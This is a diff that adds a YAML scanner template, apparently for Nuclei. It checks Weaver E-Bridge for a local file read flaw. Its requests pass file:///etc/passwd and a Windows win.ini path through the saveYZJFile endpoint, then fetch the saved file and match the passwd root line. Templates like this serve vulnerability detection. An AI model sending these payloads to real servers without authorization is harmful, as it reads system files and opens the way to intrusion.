@@ -1,0 +1,48 @@
+id: yaml-poc-weaver-weaver_e_bridge-readfile-CT-159019
+info:
+  name: Yaml Poc Weaver Weaver_E_Bridge Readfile Ct 159019
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_bridge-readfile-CT-159019'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - id
+- method: GET
+  path:
+  - /file/fileNoLogin/{{var}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
+- method: GET
+  path:
+  - /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - id
